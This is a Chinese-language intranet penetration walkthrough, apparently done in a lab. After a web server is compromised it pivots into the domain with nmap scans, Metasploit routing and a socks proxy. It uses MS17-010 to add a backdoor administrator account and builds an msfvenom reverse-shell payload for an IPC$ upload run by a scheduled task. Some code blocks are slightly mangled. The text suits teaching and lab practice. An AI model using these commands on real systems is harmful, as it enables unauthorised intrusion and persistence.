# Part1内网渗透2

## 1前言

*   在成功拿下了web端服务器后，我们就可以接着横向渗透去拿下其他服务器的管理权限。

## 2渗透过程

### 信息收集

*   通过 net view 查看域的主机。

![](../Images/08ee90b2c37a8b1f7aeb8b473e3a53d1.png)

域主机

*   发现域内还有两个主机存在。通过nmap进行主机探测。
    
*   nmap -sP 192.168.52.0/24
    

![](../Images/1bdb950a9113471ffa8ca550a67a6f0d.png)

主机

*   发现有192.168.52.138和141两个主机的存在,于是接下来我们就对这两个地址进行信息收集。
    
*   通过nmap --script=vuln进行漏洞扫描
    

![](../Images/5d3e918bb24fd85fe62cbc604ff5b026.png)

信息

*   发现这里有一个ms17-010，我们可以查找相应的利用程序进行利用。
    
*   这里还有一个445端口，是一个提供共享服务的端口，我们可以通过指令上传一个木马文件，然后设定定时任务去执行那个木马文件，成功getshell。
    

![](../Images/e6c80afd64b00a425e6958c090b38aa3.png)

445端口

### ms17-010

*   我们可以在msf中查询ms17-010,查看有没有什么利用模块,发现有一个ms17\_010\_command

![](../Images/9d8edebc4d3bd3b09351cb50c8cf6fc6.png)

利用模块

*   但是问题来了,由于我们的kali是在公网上，我们是不能直接访问内网环境的，这时候呢就需要通过sock建立一个代理，让我们的数据通过我们所能连通的web服务器转发至内网(大概就这么理解)。
    
*   首先把我们已经控制的主机加入路由用于转发。rout add 192.168.52.0 255.255.255.0 1
    

![](../Images/ac29142669b8f7f10cc1eb47d8753b22.png)

添加路由

*   然后我们来设置sock，通过background把会话放后台。

```


use auxiliary/server/socks_proxy    //使用socks代理set

 SRVHOST 192.168.1.103         //MSF本机的IP地址set

 VERSION 4a                      //设置socks代理的版本
```

*   然后输入jobs查看sock是否打开。

![](../Images/91498bdbba50f9bfda56d71c19a49760.png)

查看sock

*   这时候我们通过使用上面查找的漏洞利用模块。这个模块可以让目标服务器执行指令，我们可以在目标服务器添加一个账号。

```


//使用利用模块set

 COMMAND net user zz A1B2C3! /addset

 rhosts 192.168.52.141     
```

*   提示这样就代表指令执行完成。

![](../Images/d2dd9fde5175bdc764cb4edfa49e6dcb.png)

添加账号

*   接下来我们继续执行把我们添加的账号提升为管理员。

```

//这条指令用来把我们的账号添加进管理员组set

 COMMAND net localgroup administrators zz /add    
```

![](../Images/d0473fe1c4fc4364b1a6483aa2df2611.png)

添加管理员组

*   查看我们添加的账号是否在管理员组

```

//这条命令用于查看我们的用户是否成功添加进管理员用户组里面set

 COMMAND net localgroup administrators    
```

*   发现执行成功了,添加的账号也在里面。这样我们就拿下了这台服务器。

![](../Images/9aee4ae7cb82c29bf104956676360264.png)

查看

### IPC$

*   因为服务器还打开了445的共享端口，所以我们还有另外一种方法，就是通过上传一个木马到对方服务器的共享区，然后设定计时任务，去执行我们上传的木马。
    
*   首先用msfv去生成一个木马。
    

```

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=8888 -f exe > shell.exe
```

```


//OWA是其中一个主机名
```

*   最后在msf里面监听一下就好，另外一个服务器思路一样，就不写了。这里有一个问题，那就是内网如果要反弹shell可能会找不到我们的地址，所以可能需要通过能出网的服务器当作桥梁，所以需要搭建代理。
